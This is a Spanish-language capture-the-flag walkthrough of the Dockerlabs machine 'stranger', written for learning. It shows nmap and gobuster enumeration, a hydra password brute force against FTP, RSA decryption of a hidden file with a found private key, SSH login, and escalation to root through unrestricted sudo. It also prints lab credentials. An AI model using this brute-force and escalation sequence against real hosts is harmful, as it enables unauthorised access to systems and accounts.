# stranger

Máquina "stranger" de [Dockerlabs](https://dockerlabs.es)

Autor: kaikoperez

Dificultad: Medio

![stranger](./images/stranger/img/stranger.png)

## INTRUSION

Comenzamos haciendo un escaneo de nmap:

```css
nmap -p- -n -vvv -sSVC -Pn --open --min-rate 10000 172.17.0.2 -oN escaneo.txt
```

```ruby
# Nmap 7.94SVN scan initiated Sat Aug 31 18:29:34 2024 as: nmap -p- -n -vvv -sSVC -Pn --open --min-rate 10000 -oN escaneo.txt 172.17.0.2
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.000016s latency).
Scanned at 2024-08-31 18:29:34 -03 for 16s
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 64 vsftpd 2.0.8 or later
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f6:af:01:77:e8:fc:a4:95:85:6b:5c:9c:c7:c1:d3:98 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEuXjgTSlgC05a3pDvwBTDm3FiWRowMhCqGep4r5wa2QhSJr74w8l+svyfNNnT22bALki5ONkb4o0g4MWIHkQ+Q=
|   256 36:7e:d3:25:fa:59:38:8f:2e:21:f9:f0:28:a4:7e:44 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOunkftwL6CnjglFfQDcP0NcMIWrGWkbH2iC83ms8jSl
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-title: welcome
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: Host: my; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Aug 31 18:29:50 2024 -- 1 IP address (1 host up) scanned in 16.37 seconds
```

Como vemos están abiertos los puertos `21,22,80`, en el cual corren `ftp,ssh,apache` y como vemos ftp no tiene habilitado el login anonimo, por lo que no lo utilizaremos por ahora.

**PUERTO 80:**

![80](./images/stranger/img/80.png)

Tenemos un posible usuario: "mwheeler"

Como no se encuentra nada más, haremos fuzzing web con gobuster:

```css
gobuster dir -u http://172.17.0.2/ -w <wordlist> -x php,html,txt
```

```ruby
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 275]
/index.html           (Status: 200) [Size: 231]
/strange              (Status: 301) [Size: 310] [--> http://172.17.0.2/strange/]
Progress: 46146 / 882244 (5.23%)
===============================================================
Finished
===============================================================
```

Como vemos hay una carpeta strange, pero si entramos no hay nada interesante, por lo que haremos fuzzing pero dentro de la carpeta:

```css
gobuster dir -u http://172.17.0.2/strange -w <wordlist> -x php,html,txt
```

```ruby
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/strange
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 3040]
/.html                (Status: 403) [Size: 275]
/private.txt          (Status: 200) [Size: 64]
/secret.html          (Status: 200) [Size: 172]
/.html                (Status: 403) [Size: 275]
Progress: 203557 / 882244 (23.07%)
===============================================================
Finished
===============================================================
```

Como vemos hay un `secret.html` que si entramos desde el navegador tiene un mensaje:

![secret](./images/stranger/img/secret.png)

sabiendo eso podemos usar hydra al puerto 21 de ftp con el usuario admin y wordlist la rockyou:

```css
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://172.17.0.2
```

![hydra](./images/stranger/img/hydra.png)

Ahora que tenemos un usuario nos conectamos usando `ftp 172.17.0.2` y ponemos el usuario y contraseña.

Ahora si ejecutamos un `ls` vemos un archivo llamado "private\_key.pem", por lo que nos lo guardamos en nuestra maquina atacante usando `get private_key.pem`. Salimos del ftp y nos descargamos el archivo llamado "private.txt" que encontramos antes en `/strange/private.txt`, el cual si lo miramos, está en un formato ilegible. Ahora como tenemos el .pem podemos ejecutar lo siguiente y ver si es un formato RSA para poder descifrarlo:

```css
openssl rsautl -decrypt -inkey private_key.pem -in private.txt -out output.txt
```

Ahora si leemos el archivo de la salida, tenemos una posible contraseña: "demogorgon"

Ahora nos conectamos por el ssh usando el usuario "mwheeler" y la contraseña "demogorgon".

## ESCALADA DE PRIVILEGIOS

#### mwheeler

Si leemos el archivo `/etc/passwd` vemos que también hay un usuario admin como en el ftp, por lo que podemos probar si la contraseña "banana" también sirve. `su admin`

#### admin

Siendo el usuario admin, vemos que usamos sh, entonces para estar más comodos ejecutaremos `bash`. Ahora si ejecutamos `sudo -l` y ponemos la contraseña veremos que podemos ejecutar todo como root, asi que solo ponemos `sudo su` y listo, _somos root_.

![root](./images/stranger/img/root.png)

Gracias por leer.
